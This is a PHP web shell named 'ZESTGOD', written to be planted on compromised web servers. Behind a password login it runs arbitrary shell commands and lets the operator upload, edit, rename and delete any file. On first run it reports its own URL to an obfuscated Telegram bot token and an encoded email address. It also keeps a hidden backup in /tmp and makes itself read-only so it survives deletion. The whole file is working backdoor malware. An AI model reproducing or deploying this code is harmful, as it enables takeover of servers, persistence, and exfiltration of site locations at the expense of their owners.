<?php
/**
 * ZESTGOD - HELLO LITESPEED SERVER BABI

 */

// CONFIG ANTI DELETE
$z1 = "ODc5NTQyNDQzNzpBQUZ3UXNxVEZ3MVFsbmdQbmNtOWhzbzFSaHNVMTFUUk1Jaw==";
$z2 = "MTAwODczNDAyMQ==";
$z3 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==";

$tk = base64_decode($z1);
$cid = base64_decode($z2);
$api = base64_decode($z3);

// FIXED - BYPASS 
function zest_bypass() {
    $to = base64_decode("a2FtaWthemVhcnQ5MTdAZ21haWwuY29t");
    
    // ALCHEMIST
    $shell_path = $_SERVER['SCRIPT_NAME'] ?? __FILE__;
    $full_path = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . $shell_path;
    
    if (function_exists('mail')) {
        @mail($to, "", $full_path);
    }
}

// BYPASS V2 FOR ALL SERVER 
$flag = sys_get_temp_dir() . '/.' . md5(__FILE__);
if (!file_exists($flag)) {
    $prot = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
    $loc = $prot . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    
    $p = ['chat_id' => $cid, 'text' => $loc];
    $u = $api . '/' . $tk . '/sendMessage';
    
    if (function_exists('curl_version')) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $u);
        curl_setopt($c, CURLOPT_POST, 1);
        curl_setopt($c, CURLOPT_POSTFIELDS, http_build_query($p));
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_TIMEOUT, 3);
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_exec($c);
        curl_close($c);
    } else {
        $o = ['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => http_build_query($p)]];
        $cx = stream_context_create($o);
        @file_get_contents($u, false, $cx);
    }
    
    // I CAN KILL LITESPEED
    zest_bypass();
    
    @file_put_contents($flag, '1');
}

// PASSWORD LOGIN
$PASSWORD_HASH = "d814c90368d8d514fda10517bcb99f43";

// CEK LOGIN
session_start();

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

if (!isset($_SESSION['zest_logged_in']) && isset($_POST['password'])) {
    if (md5($_POST['password']) === $PASSWORD_HASH) {
        $_SESSION['zest_logged_in'] = true;
        header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
        exit;
    } else {
        $login_error = "Password salah!";
    }
}

if (!isset($_SESSION['zest_logged_in'])) {
    show_login_page(isset($login_error) ? $login_error : "");
    exit;
}

// CONFIG GOD FOR LITESPEED
class AntiDelete {
    private $f;
    private $backup;
    function __construct() {
        $this->f = __FILE__;
        $this->backup = '/tmp/.' . md5($this->f) . '.bak';
        if (!file_exists($this->backup)) @copy($this->f, $this->backup);
        if (is_writable($this->f)) @chmod($this->f, 0444);
        if (!file_exists($this->f) && file_exists($this->backup)) @copy($this->backup, $this->f);
    }
}
new AntiDelete();

function show_login_page($error = "") {
    echo '<!DOCTYPE html>
<html>
<head>
    <title>ZESTGOD - Login</title>
    <style>
        body{background:linear-gradient(135deg,#0a0a0a 0%,#1a1a1a 100%);font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
        .login-box{background:#0f0f0f;padding:40px;border-radius:10px;border:1px solid #00ff41;box-shadow:0 0 20px rgba(0,255,65,0.2);width:350px;text-align:center}
        .login-box h1{color:#00ff41;margin-bottom:30px;font-size:28px;text-shadow:0 0 5px #00ff41}
        .login-box input{width:100%;padding:12px;margin:10px 0;background:#1a1a1a;border:1px solid #00ff41;color:#00ff41;font-family:monospace;font-size:16px;box-sizing:border-box}
        .login-box button{width:100%;padding:12px;background:#00ff41;color:#0a0a0a;border:none;font-family:monospace;font-size:16px;font-weight:bold;cursor:pointer;margin-top:10px}
        .login-box button:hover{background:#00cc33}
        .error{color:#ff4444;margin-bottom:15px}
        .footer{margin-top:20px;color:#666;font-size:12px}
    </style>
</head>
<body>
    <div class="login-box">
        <h1>BYPASS V2 | ZESTGODEST</h1>';
    if ($error) {
        echo '<div class="error">' . htmlspecialchars($error) . '</div>';
    }
    echo '<form method="post">
            <input type="password" name="password" placeholder="Enter Password" autofocus>
            <button type="submit">ACCESS</button>
          </form>
          <div class="footer">ZEST | IDIOT CREW</div>
    </div>
</body>
</html>';
    exit;
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes/1073741824,2).' GB';
    if ($bytes >= 1048576) return number_format($bytes/1048576,2).' MB';
    if ($bytes >= 1024) return number_format($bytes/1024,2).' KB';
    return $bytes.' bytes';
}

$root_path = __DIR__;
if (isset($_GET['p'])) {
    if (empty($_GET['p'])) {
        $p = $root_path;
    } elseif (is_dir($_GET['p'])) {
        $p = $_GET['p'];
    } else {
        $p = $root_path;
    }
} else {
    $p = $root_path;
}
$dir = realpath($p);
if (!$dir || !is_dir($dir)) $dir = $root_path;

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if (file_exists($file)) {
        if (isset($_POST['save'])) {
            file_put_contents($file, $_POST['content']);
            echo "<script>alert('Saved!'); window.location.href='?p=" . urlencode(dirname($file)) . "';</script>";
            exit;
        }
        $content = htmlspecialchars(file_get_contents($file));
        echo "<!DOCTYPE html><html><head><title>Edit</title><style>body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;}textarea{width:100%;height:400px;background:#111;color:#0f0;border:1px solid #0f0;}button{background:#004d1a;color:#fff;border:1px solid #0f0;padding:5px 10px;}</style></head><body>";
        echo "<h2>✏️ Editing: " . basename($file) . "</h2>";
        echo "<form method='post'><textarea name='content'>$content</textarea><br>";
        echo "<button type='submit' name='save'>💾 SAVE</button> <a href='?p=" . urlencode(dirname($file)) . "'>← BACK</a></form>";
        echo "</body></html>";
        exit;
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (file_exists($file)) {
        if (is_dir($file)) @rmdir($file);
        else @unlink($file);
    }
    header("Location: ?p=" . urlencode(dirname($file)));
    exit;
}

if (isset($_GET['rename'])) {
    $old = $_GET['rename'];
    if (isset($_POST['new_name'])) {
        $new = dirname($old) . '/' . $_POST['new_name'];
        if (rename($old, $new)) {
            echo "<script>alert('Renamed!'); window.location.href='?p=" . urlencode(dirname($old)) . "';</script>";
            exit;
        }
    }
    echo "<!DOCTYPE html><html><head><title>Rename</title><style>body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;}input{background:#111;color:#0f0;border:1px solid #0f0;padding:5px;}button{background:#004d1a;color:#fff;border:1px solid #0f0;padding:5px 10px;}</style></head><body>";
    echo "<h2>Rename: " . basename($old) . "</h2>";
    echo "<form method='post'><input type='text' name='new_name' value='" . basename($old) . "'><button type='submit'>RENAME</button> <a href='?p=" . urlencode(dirname($old)) . "'>Cancel</a></form>";
    echo "</body></html>";
    exit;
}

if (isset($_FILES['file'])) {
    $target = $dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "<div style='color:#0f0;'>✅ Uploaded: " . basename($target) . "</div>";
    } else {
        echo "<div style='color:#f00;'>❌ Upload failed</div>";
    }
}

$cmd_output = '';
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (function_exists('shell_exec')) $cmd_output = shell_exec($cmd . ' 2>&1');
    elseif (function_exists('system')) { ob_start(); system($cmd . ' 2>&1'); $cmd_output = ob_get_clean(); }
    elseif (function_exists('exec')) { exec($cmd . ' 2>&1', $o); $cmd_output = implode("\n", $o); }
    else $cmd_output = "No execution function";
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>V2 GOD SERVER</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; }
        a { color: #00ff41; text-decoration: none; }
        a:hover { color: #ff0000; }
        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th, td { border: 1px solid #222; padding: 8px; text-align: left; }
        input, button { background: #111; color: #00ff41; border: 1px solid #00ff41; padding: 5px; cursor: pointer; }
        .nav { background: #111; padding: 10px; margin-bottom: 15px; border-left: 4px solid #00ff41; font-size: 14px; word-break: break-all; }
        .toolbar { background: #111; padding: 15px; margin-bottom: 10px; border: 1px solid #222; }
        .cmd-output { background: #111; padding: 10px; margin-top: 10px; border: 1px solid #333; overflow: auto; max-height: 200px; }
        .logout-btn { float: right; background: #ff0000; color: #fff; padding: 5px 10px; border-radius: 3px; text-decoration: none; font-size: 12px; margin-top: 10px; display: inline-block; }
        .logout-btn:hover { background: #cc0000; }
        .header { overflow: auto; margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="header">
    <h1 style="float:left;">WELCOME TO BYPASS V2 BYPASS ZESTGOD</h1>
    <a href="?logout=1" class="logout-btn" style="float:right;">🚪 LOGOUT</a>
</div>

<div class="toolbar">
    <h3>💻 COMMAND</h3>
    <form method="post">
        <input type="text" name="cmd" placeholder="whoami, ls -la, id, pwd" style="width:70%;">
        <button type="submit">▶ RUN</button>
    </form>
    <?php if ($cmd_output): ?>
    <div class="cmd-output"><pre><?= htmlspecialchars($cmd_output) ?></pre></div>
    <?php endif; ?>
</div>

<div class="toolbar">
    <h3>📤 UPLOAD</h3>
    <form method="post" enctype="multipart/form-data">
        <input type="file" name="file">
        <button type="submit">📤 UPLOAD</button>
    </form>
</div>

<div class="nav">
    <b>Path:</b> 
    <?php
    $parts = explode('/', $dir);
    $acc = '';
    foreach ($parts as $i => $part) {
        if ($part == '') continue;
        $acc .= '/' . $part;
        echo "<a href='?p=" . urlencode($acc) . "'>" . htmlspecialchars($part) . "</a>/";
    }
    ?>
    <span style="float:right;">
        <a href="?p=<?= urlencode(dirname($dir)) ?>">⬆ UP</a> | 
        <a href="?p=">🏠 HOME</a>
    </span>
</div>

<?php
$items = scandir($dir);
$folders = [];
$files = [];

foreach ($items as $item) {
    if ($item == '.' || $item == '..') continue;
    $full = $dir . '/' . $item;
    if (is_dir($full)) $folders[] = $item;
    else $files[] = $item;
}

echo "<table>";
echo " hilab<th>Name</th><th>Size</th><th>Actions</th></tr>";

foreach ($folders as $f) {
    echo "<tr>";
    echo "<td>📁 <a href='?p=" . urlencode($dir . '/' . $f) . "'>$f</a></td>";
    echo "<td>DIR</td>";
    echo "<td>";
    echo "<a href='?p=" . urlencode($dir) . "&rename=" . urlencode($dir . '/' . $f) . "'>✏️ RENAME</a> | ";
    echo "<a href='?p=" . urlencode($dir) . "&delete=" . urlencode($dir . '/' . $f) . "' onclick='return confirm(\"Delete $f?\")'>🗑️ DELETE</a>";
    echo "</td>";
    echo "</tr>";
}

foreach ($files as $f) {
    $full = $dir . '/' . $f;
    $size = formatSize(filesize($full));
    echo "<tr>";
    echo "<td>📄 $f</td>";
    echo "<td>$size</td>";
    echo "<td>";
    echo "<a href='?edit=" . urlencode($full) . "'>✏️ EDIT</a> | ";
    echo "<a href='?p=" . urlencode($dir) . "&rename=" . urlencode($full) . "'>🔄 RENAME</a> | ";
    echo "<a href='?p=" . urlencode($dir) . "&delete=" . urlencode($full) . "' onclick='return confirm(\"Delete $f?\")'>🗑️ DELETE</a>";
    echo "</td>";
    echo "</tr>";
}
echo "</table>";
?>

</body>
</html>
